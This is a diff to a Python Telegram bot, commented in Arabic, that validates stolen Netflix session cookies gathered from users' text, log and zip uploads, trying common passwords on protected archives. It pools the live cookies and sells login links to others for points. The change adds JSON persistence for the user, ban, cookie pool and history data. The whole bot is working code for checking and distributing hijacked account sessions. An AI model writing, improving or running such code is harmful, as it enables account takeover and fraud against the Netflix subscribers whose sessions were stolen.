@@ -2,6 +2,7 @@ import telebot
 import pyzipper
 import os
 import re
+import json
 import shutil
 import urllib.parse
 import time
@@ -18,7 +19,7 @@ bot = telebot.TeleBot(TOKEN)
 
 # 👑 إعدادات المطور الخاصة بك (فارس)
 DEVELOPER_CHAT_ID = 8713916851
-DEVELOPER_USERNAME = "farxxes" 
+DEVELOPER_USERNAME = "farxxes"
 CHANNEL_LINK = "https://t.me/farxxess"
 
 # إعدادات السيرفرات العشوائية
@@ -35,12 +36,65 @@ BASE_TEMP_DIR = "final_output_temp"
 if not os.path.exists(BASE_TEMP_DIR):
     os.makedirs(BASE_TEMP_DIR)
 
-# --- قواعد البيانات المؤقتة في الذاكرة ---
-VALID_COOKIES_POOL = []     
-USED_COOKIES_HISTORY = set() 
-USER_DATABASE = {}           
-BANNED_USERS = set()         
-active_scans = {}            
+# ====================================================
+# ✅ نظام الحفظ الدائم بملفات JSON
+# ====================================================
+DB_DIR = "database"
+if not os.path.exists(DB_DIR):
+    os.makedirs(DB_DIR)
+
+DB_USERS_FILE      = os.path.join(DB_DIR, "users.json")
+DB_BANNED_FILE     = os.path.join(DB_DIR, "banned.json")
+DB_COOKIES_FILE    = os.path.join(DB_DIR, "cookies_pool.json")
+DB_HISTORY_FILE    = os.path.join(DB_DIR, "used_history.json")
+
+db_lock = threading.Lock()
+
+def load_json(path, default):
+    try:
+        if os.path.exists(path):
+            with open(path, "r", encoding="utf-8") as f:
+                return json.load(f)
+    except Exception:
+        pass
+    return default
+
+def save_json(path, data):
+    with db_lock:
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
+
+def load_all_data():
+    global USER_DATABASE, BANNED_USERS, VALID_COOKIES_POOL, USED_COOKIES_HISTORY
+    raw_users = load_json(DB_USERS_FILE, {})
+    # JSON يحوّل المفاتيح لـ string، نحوّلها لأرقام
+    USER_DATABASE = {int(k): v for k, v in raw_users.items()}
+    BANNED_USERS  = set(load_json(DB_BANNED_FILE, []))
+    VALID_COOKIES_POOL   = load_json(DB_COOKIES_FILE, [])
+    USED_COOKIES_HISTORY = set(load_json(DB_HISTORY_FILE, []))
+    print(f"✅ تم تحميل البيانات: {len(USER_DATABASE)} مستخدم | {len(VALID_COOKIES_POOL)} كوكيز | {len(BANNED_USERS)} محظور")
+
+def save_users():
+    save_json(DB_USERS_FILE, {str(k): v for k, v in USER_DATABASE.items()})
+
+def save_banned():
+    save_json(DB_BANNED_FILE, list(BANNED_USERS))
+
+def save_cookies():
+    save_json(DB_COOKIES_FILE, VALID_COOKIES_POOL)
+
+def save_history():
+    save_json(DB_HISTORY_FILE, list(USED_COOKIES_HISTORY))
+
+# تحميل البيانات عند بدء التشغيل
+USER_DATABASE        = {}
+BANNED_USERS         = set()
+VALID_COOKIES_POOL   = []
+USED_COOKIES_HISTORY = set()
+active_scans         = {}
+
+load_all_data()
+# ====================================================
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
@@ -74,6 +128,11 @@ def check_ban(func):
             return
         return func(message, *args, **kwargs)
     return wrapper
+
+def ensure_user(chat_id, username=""):
+    if chat_id not in USER_DATABASE:
+        USER_DATABASE[chat_id] = {"points": 5, "username": username, "role": "MEMBER"}
+        save_users()
 
 def extract_clean_netflix_ids(text):
     cleaned_ids = []
@@ -115,12 +174,13 @@ def check_netflix_cookie_detailed(netflix_id):
         return None
 
 def auto_clean_pool_job():
-    global VALID_COOKIES_POOL
     while True:
-        time.sleep(43200) 
+        time.sleep(43200)
         if VALID_COOKIES_POOL:
             still_valid = [cookie for cookie in VALID_COOKIES_POOL if check_netflix_cookie_detailed(cookie)]
-            VALID_COOKIES_POOL = still_valid
+            VALID_COOKIES_POOL.clear()
+            VALID_COOKIES_POOL.extend(still_valid)
+            save_cookies()
 
 threading.Thread(target=auto_clean_pool_job, daemon=True).start()
 
@@ -137,8 +197,7 @@ def safe_send_message(chat_id, text, markup=None):
     return None
 
 def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_name):
-    if chat_id not in USER_DATABASE:
-        USER_DATABASE[chat_id] = {"points": 5, "username": "", "role": "MEMBER"}
+    ensure_user(chat_id)
     total_count = len(netflix_ids)
     active_scans[chat_id] = True
     clean_source_name = source_name.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")
@@ -154,22 +213,28 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         if index % 5 == 0 or index == total_count:
             try:
                 bot.edit_message_text(f"⏳ جاري الفحص: ({index}/{total_count})\n✅ شغال: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}", chat_id, status.message_id, reply_markup=stop_markup)
-            except Exception: pass
+            except Exception:
+                pass
         result = check_netflix_cookie_detailed(netflix_id)
         if result:
-            if is_duplicate: dup_count += 1
+            if is_duplicate:
+                dup_count += 1
             else:
                 live_count += 1
                 USED_COOKIES_HISTORY.add(netflix_id)
-                if netflix_id not in VALID_COOKIES_POOL: VALID_COOKIES_POOL.append(netflix_id)
+                if netflix_id not in VALID_COOKIES_POOL:
+                    VALID_COOKIES_POOL.append(netflix_id)
+                # ✅ حفظ فوري عند إضافة كوكيز جديد
+                save_cookies()
+                save_history()
             token = result["token"]
             expires = result["expires"]
-            if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
+            if isinstance(expires, int) and len(str(expires)) == 13:
+                expires //= 1000
             date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
             full_cookie_string = f"NetflixId={netflix_id}"
             direct_netflix_url = "https://www.netflix.com/" if result["bypass"] else f"https://netflix.com/?nftoken={token}"
             encoded_cookie = urllib.parse.quote(full_cookie_string)
-            # التعديل المطلوب هنا
             chosen_host = random.choice(api_hosts)
             bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
             dup_tag = " (مكرر شغال)" if is_duplicate else ""
@@ -182,12 +247,16 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         else:
             if is_duplicate:
                 USED_COOKIES_HISTORY.discard(netflix_id)
-                if netflix_id in VALID_COOKIES_POOL: VALID_COOKIES_POOL.remove(netflix_id)
+                if netflix_id in VALID_COOKIES_POOL:
+                    VALID_COOKIES_POOL.remove(netflix_id)
+                save_cookies()
+                save_history()
             dead_count += 1
         time.sleep(0.1)
     active_scans.pop(chat_id, None)
     safe_send_message(chat_id, f"📊 **اكتمل الفحص والتصفية!**\n\n✅ المضاف للمخزن الجديد: {live_count}\n❌ التالف: {dead_count}\n✂️ المكرر الشغال المرسل: {dup_count}\n\n🪙 رصيدك الحالي: {USER_DATABASE[chat_id]['points']} نقطة 🪙")
-    if live_accounts_accumulator: send_txt_file(chat_id, live_accounts_accumulator, source_name)
+    if live_accounts_accumulator:
+        send_txt_file(chat_id, live_accounts_accumulator, source_name)
 
 def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="Cookies_File.txt"):
     if not netflix_ids:
@@ -200,11 +269,14 @@ def send_txt_file(chat_id, accounts_list, original_filename):
         clean_name = os.path.splitext(original_filename)[0]
         output_txt_path = os.path.join(BASE_TEMP_DIR, f"{clean_name}_LIVE.txt")
         with open(output_txt_path, 'w', encoding='utf-8') as f:
-            for item in accounts_list: f.write(item)
+            for item in accounts_list:
+                f.write(item)
         with open(output_txt_path, 'rb') as doc:
-            bot.send_document(chat_id, doc, caption=f"📁 ملف الحسابات الشغالة المجمعة الخريجة من الفحص الحالي 🔥")
-        if os.path.exists(output_txt_path): os.remove(output_txt_path)
-    except Exception as e: print(e)
+            bot.send_document(chat_id, doc, caption="📁 ملف الحسابات الشغالة المجمعة الخريجة من الفحص الحالي 🔥")
+        if os.path.exists(output_txt_path):
+            os.remove(output_txt_path)
+    except Exception as e:
+        print(e)
 
 def generate_main_keyboard(user_id):
     points = USER_DATABASE.get(user_id, {}).get("points", 5)
@@ -229,8 +301,9 @@ def generate_main_keyboard(user_id):
 @check_ban
 def send_welcome(message):
     chat_id = message.chat.id
-    if chat_id not in USER_DATABASE:
-        USER_DATABASE[chat_id] = {"points": 5, "username": message.from_user.username or "", "role": "MEMBER"}
+    is_new = chat_id not in USER_DATABASE
+    ensure_user(chat_id, message.from_user.username or "")
+    if is_new:
         welcome_txt = "مرحباً بك في بوت نتفلكس الذكي الخاص بفارس 😉🔥\n\n🎁 كهدية ترحيبية، **تم منحك 5 نقاط مجانية** للتجربة فوراً!"
     else:
         welcome_txt = "مرحباً بك مجدداً في لوحة التحكم الخاصة بك المحدثة 👇"
@@ -246,54 +319,75 @@ def send_user_id(message):
 
 @bot.message_handler(commands=['add'])
 def add_points_command(message):
-    if message.chat.id != DEVELOPER_CHAT_ID: return
+    if message.chat.id != DEVELOPER_CHAT_ID:
+        return
     try:
         command_parts = message.text.split()
         if message.reply_to_message:
             target_id = message.reply_to_message.from_user.id
             amount = int(command_parts[1])
         else:
+            # الاستخدام: /add [amount] [id]
             amount = int(command_parts[1])
             target_id = int(command_parts[2])
-        if target_id not in USER_DATABASE: USER_DATABASE[target_id] = {"points": 5, "username": "", "role": "MEMBER"}
+        ensure_user(target_id)
         USER_DATABASE[target_id]["points"] += amount
-        bot.reply_to(message, f"✅ تم إضافة **+{amount}** نقطة بنجاح لحسابه.")
-    except Exception: bot.reply_to(message, "⚠️ الاستخدام: بالرد `/add 10` أو رسالة عادية `/add 10 [الآيدي]`")
+        save_users()  # ✅ حفظ فوري
+        bot.reply_to(message, f"✅ تم إضافة **+{amount}** نقطة بنجاح.\n🪙 رصيده الآن: {USER_DATABASE[target_id]['points']} نقطة", parse_mode="Markdown")
+        # إشعار المستخدم بالشحن
+        try:
+            bot.send_message(target_id, f"🎉 تم شحن رصيدك!\n\n🪙 تمت إضافة **+{amount}** نقطة إلى حسابك.\n💰 رصيدك الحالي: **{USER_DATABASE[target_id]['points']} نقطة**", parse_mode="Markdown")
+        except Exception:
+            pass
+    except Exception:
+        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/add 10` أو رسالة عادية `/add 10 [الآيدي]`")
 
 @bot.message_handler(commands=['setvip'])
 def set_vip_command(message):
-    if message.chat.id != DEVELOPER_CHAT_ID: return
+    if message.chat.id != DEVELOPER_CHAT_ID:
+        return
     try:
         command_parts = message.text.split()
         target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
-        if target_id not in USER_DATABASE: USER_DATABASE[target_id] = {"points": 5, "username": "", "role": "MEMBER"}
+        ensure_user(target_id)
         USER_DATABASE[target_id]["role"] = "VIP"
+        save_users()  # ✅ حفظ فوري
         bot.reply_to(message, f"👑 تم ترقية المستخدم `{target_id}` إلى رتبة **VIP** بنجاح! سحب مجاني للأبد.")
-    except Exception: bot.reply_to(message, "⚠️ الاستخدام: بالرد `/setvip` أو عادياً `/setvip [الآيدي]`")
+        try:
+            bot.send_message(target_id, "🎊 مبروك! تمت ترقيتك إلى رتبة **VIP** 💎\nيمكنك الآن سحب حسابات نتفلكس بشكل مجاني وبلا حدود!", parse_mode="Markdown")
+        except Exception:
+            pass
+    except Exception:
+        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/setvip` أو عادياً `/setvip [الآيدي]`")
 
 @bot.message_handler(commands=['ban'])
 def ban_user_command(message):
-    if message.chat.id != DEVELOPER_CHAT_ID: return
+    if message.chat.id != DEVELOPER_CHAT_ID:
+        return
     try:
         command_parts = message.text.split()
         target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
         BANNED_USERS.add(target_id)
+        save_banned()  # ✅ حفظ فوري
         bot.reply_to(message, f"🚫 تم حظر المستخدم `{target_id}` بنجاح.")
-    except Exception: bot.reply_to(message, "⚠️ الاستخدام: بالرد `/ban` أو عادياً `/ban [الآيدي]`")
+    except Exception:
+        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/ban` أو عادياً `/ban [الآيدي]`")
 
 @bot.message_handler(commands=['unban'])
 def unban_user_command(message):
-    if message.chat.id != DEVELOPER_CHAT_ID: return
+    if message.chat.id != DEVELOPER_CHAT_ID:
+        return
     try:
         command_parts = message.text.split()
         target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
         BANNED_USERS.discard(target_id)
+        save_banned()  # ✅ حفظ فوري
         bot.reply_to(message, f"🟢 تم إلغاء حظر المستخدم `{target_id}` بنجاح.")
-    except Exception: bot.reply_to(message, "⚠️ الاستخدام: بالرد `/unban` أو عادياً `/unban [الآيدي]`")
+    except Exception:
+        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/unban` أو عادياً `/unban [الآيدي]`")
 
 def execute_dispense_logic(chat_id):
-    if chat_id not in USER_DATABASE:
-        USER_DATABASE[chat_id] = {"points": 5, "username": "", "role": "MEMBER"}
+    ensure_user(chat_id)
     role = USER_DATABASE[chat_id]["role"]
     if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and USER_DATABASE[chat_id]["points"] <= 0:
         return {"status": "no_points"}
@@ -303,15 +397,18 @@ def execute_dispense_logic(chat_id):
         current_cookie = VALID_COOKIES_POOL.pop(0)
         fresh_result = check_netflix_cookie_detailed(current_cookie)
         if fresh_result:
-            if chat_id != DEVELOPER_CHAT_ID and role != "VIP": USER_DATABASE[chat_id]["points"] -= 1
+            if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
+                USER_DATABASE[chat_id]["points"] -= 1
+                save_users()  # ✅ حفظ فوري بعد خصم نقطة
+            save_cookies()    # ✅ حفظ الكوكيز بعد سحب
             token = fresh_result["token"]
             expires = fresh_result["expires"]
-            if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
+            if isinstance(expires, int) and len(str(expires)) == 13:
+                expires //= 1000
             date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
             full_cookie_string = f"NetflixId={current_cookie}"
             direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
             encoded_cookie = urllib.parse.quote(full_cookie_string)
-            # التعديل المطلوب هنا
             chosen_host = random.choice(api_hosts)
             bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
             short_id = current_cookie[:20]
@@ -322,9 +419,13 @@ def execute_dispense_logic(chat_id):
             user_markup.add(InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
             user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
             user_markup.add(InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"), InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}"))
-            if current_cookie not in VALID_COOKIES_POOL: VALID_COOKIES_POOL.append(current_cookie)
+            if current_cookie not in VALID_COOKIES_POOL:
+                VALID_COOKIES_POOL.append(current_cookie)
+            save_cookies()
             return {"status": "success", "text": success_text, "markup": user_markup}
-        else: continue
+        else:
+            save_cookies()
+            continue
     return {"status": "expired", "message": "❌ عذراً، انتهت صلاحية الكوكيز المتوفرة بالمخزن فجأة."}
 
 @bot.callback_query_handler(func=lambda call: call.data == "ask_how_to_use")
@@ -340,9 +441,12 @@ def dispense_account_on_button(call):
     chat_id = call.message.chat.id
     bot.answer_callback_query(call.id, "⏳ جاري فحص الحساب وسحب الرابط...")
     response = execute_dispense_logic(chat_id)
-    if response["status"] == "success": bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
-    elif response["status"] == "no_points": bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! يرجى التواصل مع فارس لشحن رصيدك.", reply_markup=generate_main_keyboard(chat_id))
-    else: bot.send_message(chat_id, response["message"])
+    if response["status"] == "success":
+        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
+    elif response["status"] == "no_points":
+        bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! يرجى التواصل مع فارس لشحن رصيدك.", reply_markup=generate_main_keyboard(chat_id))
+    else:
+        bot.send_message(chat_id, response["message"])
 
 @bot.callback_query_handler(func=lambda call: call.data == "menu_check")
 def menu_check_button(call):
@@ -360,7 +464,6 @@ def pool_status(call):
 @bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
 @check_ban
 def handle_user_feedback(call):
-    global VALID_COOKIES_POOL
     data_parts = call.data.split('_')
     action, short_id = data_parts[1], data_parts[2]
     user_info = call.from_user
@@ -373,25 +476,38 @@ def handle_user_feedback(call):
             break
     if action == "yes":
         bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
-        try: bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح، مشاهدة ممتعة!", chat_id, call.message.message_id, reply_markup=None)
-        except Exception: pass
+        try:
+            bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح، مشاهدة ممتعة!", chat_id, call.message.message_id, reply_markup=None)
+        except Exception:
+            pass
         if target_cookie:
             dev_log_text = f"👑 **سحب ناجح!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
-            try: bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
-            except Exception: pass
+            try:
+                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
+            except Exception:
+                pass
     elif action == "no":
         if target_cookie and target_cookie in VALID_COOKIES_POOL:
             VALID_COOKIES_POOL.remove(target_cookie)
+            save_cookies()  # ✅ حفظ بعد حذف كوكيز تالف
             bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك فوراً...", show_alert=True)
-            try: bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
-            except Exception: pass
-        else: bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
-        try: bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
-        except Exception: pass
+            try:
+                bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
+            except Exception:
+                pass
+        else:
+            bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
+        try:
+            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
+        except Exception:
+            pass
         response = execute_dispense_logic(chat_id)
-        if response["status"] == "success": bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
-        elif response["status"] == "no_points": bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
-        else: bot.send_message(chat_id, response["message"])
+        if response["status"] == "success":
+            bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
+        elif response["status"] == "no_points":
+            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
+        else:
+            bot.send_message(chat_id, response["message"])
 
 def open_admin_panel_msg(chat_id):
     markup = InlineKeyboardMarkup()
@@ -413,7 +529,8 @@ def start_broadcast_process(call):
     bot.register_next_step_handler(msg, process_broadcast_sending)
 
 def process_broadcast_sending(message):
-    if message.chat.id != DEVELOPER_CHAT_ID: return
+    if message.chat.id != DEVELOPER_CHAT_ID:
+        return
     broadcast_text = message.text
     sent_count = 0
     bot.send_message(DEVELOPER_CHAT_ID, "⏳ جاري بدء الإذاعة ونشر الرسالة لجميع المشتركين...")
@@ -422,19 +539,21 @@ def process_broadcast_sending(message):
             bot.send_message(u_id, f"📢 **إعلان من إدارة البوت:**\n\n{broadcast_text}", parse_mode="Markdown")
             sent_count += 1
             time.sleep(0.05)
-        except Exception: pass
+        except Exception:
+            pass
     bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")
 
 @bot.callback_query_handler(func=lambda call: call.data == "admin_clear_history")
 def clear_history_action(call):
-    global USED_COOKIES_HISTORY
     USED_COOKIES_HISTORY.clear()
+    save_history()  # ✅ حفظ بعد المسح
     bot.answer_callback_query(call.id, "✅ تم مسح تاريخ التكرار بنجاح لإتاحة فحص الملفات القديمة مجدداً.", show_alert=True)
 
 def unzip_and_extract_ids(zip_path, extract_to, password=None):
     try:
         with pyzipper.AESZipFile(zip_path) as zip_ref:
-            if password: zip_ref.setpassword(password.encode('utf-8'))
+            if password:
+                zip_ref.setpassword(password.encode('utf-8'))
             zip_ref.extractall(path=extract_to)
         all_cookies = []
         for root, dirs, files in os.walk(extract_to):
@@ -445,26 +564,34 @@ def unzip_and_extract_ids(zip_path, extract_to, password=None):
                         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                             content = f.read()
                             for nid in extract_clean_netflix_ids(content):
-                                if nid not in all_cookies: all_cookies.append(nid)
-                    except Exception: pass
+                                if nid not in all_cookies:
+                                    all_cookies.append(nid)
+                    except Exception:
+                        pass
         return True, all_cookies, None
     except RuntimeError as e:
-        if 'encrypted' in str(e) or 'password' in str(e) or 'Bad password' in str(e): return False, [], "ENCRYPTED"
+        if 'encrypted' in str(e) or 'password' in str(e) or 'Bad password' in str(e):
+            return False, [], "ENCRYPTED"
         return False, [], str(e)
-    except Exception as e: return False, [], str(e)
+    except Exception as e:
+        return False, [], str(e)
 
 def process_zip_entry(message, file_path, password=None, password_msg_id=None, original_name="Extracted_Archive.txt"):
     chat_id = message.chat.id
     user_work_dir = os.path.join(BASE_TEMP_DIR, f"{chat_id}_{int(time.time())}")
-    if os.path.exists(user_work_dir): shutil.rmtree(user_work_dir)
+    if os.path.exists(user_work_dir):
+        shutil.rmtree(user_work_dir)
     os.makedirs(user_work_dir)
     success, final_ids, error_type = unzip_and_extract_ids(file_path, user_work_dir, password)
     if password_msg_id:
-        try: bot.delete_message(chat_id, password_msg_id)
-        except Exception: pass
+        try:
+            bot.delete_message(chat_id, password_msg_id)
+        except Exception:
+            pass
     if success:
         shutil.rmtree(user_work_dir)
-        if os.path.exists(file_path): os.remove(file_path)
+        if os.path.exists(file_path):
+            os.remove(file_path)
         process_cookies_list_and_check(chat_id, final_ids, message.message_id, source_name=original_name)
     elif error_type == "ENCRYPTED":
         if not password:
@@ -478,7 +605,8 @@ def process_zip_entry(message, file_path, password=None, password_msg_id=None, o
             buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{file_path}_{original_name}") for pwd in COMMON_PASSWORDS]
             markup.add(*buttons)
             bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة للمتابعة أو الفك الفوري:", reply_markup=markup)
-    else: bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")
+    else:
+        bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")
 
 @bot.message_handler(content_types=['document'])
 @check_ban
@@ -488,7 +616,8 @@ def handle_incoming_document(message):
     if file_name_lower.endswith('.zip'):
         file_info = bot.get_file(message.document.file_id)
         local_path = os.path.join(BASE_TEMP_DIR, f"incoming_{message.chat.id}_{int(time.time())}.zip")
-        with open(local_path, 'wb') as f: f.write(bot.download_file(file_info.file_path))
+        with open(local_path, 'wb') as f:
+            f.write(bot.download_file(file_info.file_path))
         process_zip_entry(message, local_path, original_name=file_name)
     elif file_name_lower.endswith('.txt') or file_name_lower.endswith('.log'):
         file_info = bot.get_file(message.document.file_id)
@@ -503,7 +632,8 @@ def handle_inline_passwords(call):
     remaining_parts = data_parts[2:]
     original_name = remaining_parts[-1]
     file_path = "_".join(remaining_parts[:-1])
-    if os.path.exists(file_path): process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)
+    if os.path.exists(file_path):
+        process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
 def handle_stop_button(call):
@@ -511,8 +641,10 @@ def handle_stop_button(call):
     if target_chat_id in active_scans:
         active_scans[target_chat_id] = False
         bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص الحالية بناءً على طلبك...")
-        try: bot.edit_message_reply_markup(target_chat_id, call.message.message_id, reply_markup=None)
-        except Exception: pass
+        try:
+            bot.edit_message_reply_markup(target_chat_id, call.message.message_id, reply_markup=None)
+        except Exception:
+            pass
 
 @bot.message_handler(func=lambda message: True)
 @check_ban
@@ -520,7 +652,9 @@ def handle_plain_text(message):
     process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(message.text), message.message_id, source_name="Direct_Text.txt")
 
 if __name__ == "__main__":
-    print("🚀 تم تشغيل البوت بنجاح وهو نظيف تماماً وخالٍ من الاشتراكات الإجبارية والقنوات...")
+    print("🚀 تم تشغيل البوت بنجاح مع نظام الحفظ الدائم (JSON Database)...")
     while True:
-        try: bot.polling(none_stop=True, skip_pending=True)
-        except Exception: time.sleep(3)
+        try:
+            bot.polling(none_stop=True, skip_pending=True)
+        except Exception:
+            time.sleep(3)
